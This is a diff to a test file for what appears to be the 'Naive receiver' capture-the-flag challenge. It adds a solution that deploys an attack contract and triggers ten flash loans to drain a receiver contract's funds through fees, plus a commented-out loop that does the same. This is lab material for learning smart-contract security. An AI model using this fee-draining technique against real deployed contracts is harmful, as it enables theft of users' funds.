@@ -30,7 +30,17 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */  
+
+        // Simply flash loan 10 times to drain the user's funds
+        const AttackFactory = await ethers.getContractFactory('NaiveReceiverAttack', deployer)
+        this.attack = await AttackFactory.deploy(this.pool.address);
+        await this.attack.flashLoanMultiple(10, this.receiver.address)
+
+        // Alternative solution
+        // for (let i = 0; i < 10; i++) {
+        //     await this.pool.flashLoan (this.receiver.address, "1");
+        // }
     });
 
     after(async function () {
